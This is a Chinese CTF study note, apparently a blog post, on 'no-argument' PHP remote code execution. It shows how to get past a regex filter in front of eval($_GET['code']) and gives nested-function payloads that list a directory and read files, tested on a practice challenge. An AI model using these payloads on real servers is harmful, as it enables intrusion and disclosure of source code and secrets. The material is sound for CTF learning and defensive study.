---
title: 无参数rce
date: 2022-07-13 22:31:00
tags:
- web
categories:
- [笔记, web笔记]
- [刷题, web题集]
---

## 前置知识：

1、文件读取函数：

1. show_source():对文件进行语法高亮显示;
2. highlight_file():对文件进行语法高亮显示;
3. readfile():
4. file_get_contents():
5. file():

**tips:**show_source()和highlight_file()函数无法直接在页面输出需要配合echo（）等函数一同使用；

2、写题时常用的输出函数：

1. print_r():
2. var_dump():
3. echo():

3、无参数rce常见正则匹配

1、'/[^\W]+\((?R)?\)/'

2、`'/[a-z,_]+\((?R)?\)/'`



## 正文

1、什么是无参数函数RCE

我们常用eval($_GET['code']);来实现一句换木马和getshell,但是如果开发者进行了过滤:

```
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);
}
```

![img](/02.png)
 那么我们就无法使用参数，也就无法通过正则的校验

在此过滤条件下我们只能执行如下格式的函数

a();
 a(b());
 不可使用

a('abc');

这样对我们使用scandir('.')等查看目录文件造成了很大影响，所以我们要进行构造；


构造思路：

# 1、char（46）==>'.'

1. char(rand())==>对于随机这种东西不太推荐（尤其是手动测试的时候)                               

\2.   char(time())==>chr()函数以256为一个周期，所以chr(46),chr(302),chr(558)都等于"." 

所以使用chr(time())，一个周期必定出现一次"."                                                      

\3.    

1. localtime(time())==>数组第一个值每秒+1，所以最多60秒就一定能得到46，用current(pos)就能获得"."                                                                                                   (可能是我的食用方式不大对，在使用2、3两个方法测试时并没有得到预期值T。T)             
2. phpversion返回计算![img](/03.png)![img](/02.png)编辑

payload：chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))) 

测试（题目，buu禁止套娃）：

​     ![img](/04.png)![img](/02.png)编辑

5.crypt()配合ord()

ord()返回字符串中第一个字符的Ascii值

hebrevc(crypt(arg))可以随机生成一个hash值，第一个字符随机是$(大概率) 或者 "."(小概率) 然后通过chr(ord())只取第一个字符；

注：因为随机所以第一次不一定会出值，多刷新几次即可；

payload:chr(ord(hebrevc(crypt(time()))))

测试（题目，buu禁止套娃）：

 ![img](/06.png)![img](/02.png)编辑

 

# 2、寻找返回信息中带'.'的函数通过一些计算，分割等方法获得'.';

1. payload:var_dump(scandir(current(localeconv())));就可以遍历当前目录所有文件。

​    ![img](/08.png)![img](/02.png)编辑

current():它还有别名pos()，其实都是一样的。

输出数组当前元素的值，每一个数组中都有一个内部的指针，指向他当前的元素。初始指向当前数组中的第一个元素。这个函数不会移动指针，但是有next()函数和prev函数可以移动指针。

### tips:如果在写题过程中这两个函数都被禁用了还可以使用reset（）函数；

![img](/10.png)![img](/02.png)编辑![img](/12.png)![img](C:/Users/16956/Desktop/msohtmlclip1/01/02.png)编辑

测试（题目，buu禁止套娃）：

![img](/14.png)![img](C:/Users/16956/Desktop/msohtmlclip1/01/02.png)编辑

 

​    \2. 利用环境参数

phpversion():

 ![img](/16.png)![img](C:/Users/16956/Desktop/msohtmlclip1/01/02.png)编辑

zend_version():

![img](/17.png)![img](C:/Users/16956/Desktop/msohtmlclip1/01/02.png)编辑

 因为是返回版本有关参数（eg：2.4.0）所以我们可以配合str_split()函数，next（），prev（）等函数获取'.';

payload:scandir(next(str_split(zend_version())));

测试（题目，buu禁止套娃）：

![img](/19.png)![img](C:/Users/16956/Desktop/msohtmlclip1/01/02.png)编辑

 

payload:scandir(next(str_split(phpversion())));

测试（题目，buu禁止套娃）：

![img](/21.png)![img](C:/Users/16956/Desktop/msohtmlclip1/01/02.png)编辑

我们还可以用print_r(scandir('绝对路径'));来查看当前目录文件名；

读取当前目录文件

通过前面的方法输出了当前目录文件名，如果文件不能直接显示，比如PHP源码，我们还需要使用函数读取：

前面的方法输出的是数组，文件名是数组的值，那我们要怎么取出想要读取文件的数组呢：

查询PHP手册发现：

current（），each（），end（），next（），prev（）函数

手册里有这些方法，如果要获取的数组是最后一个我们可以用：

show_source(end(scandir(getcwd())));或者用readfile、highlight_file、file_get_contents 等读文件函数都可以（使用readfile和file_get_contents读文件，显示在源码处）

ps：readgzfile()也可读文件，常用于绕过过滤；

 

 

# 最后对文件进行读取：

array_reverse() 以相反的元素顺序返回数组；

我们可以使用array_rand(array_flip())，array_flip()是交换数组的键和值，array_rand()是随机返回一个数组。配合next，current等控制指针的函数调用我们所需要查看的文件即可；
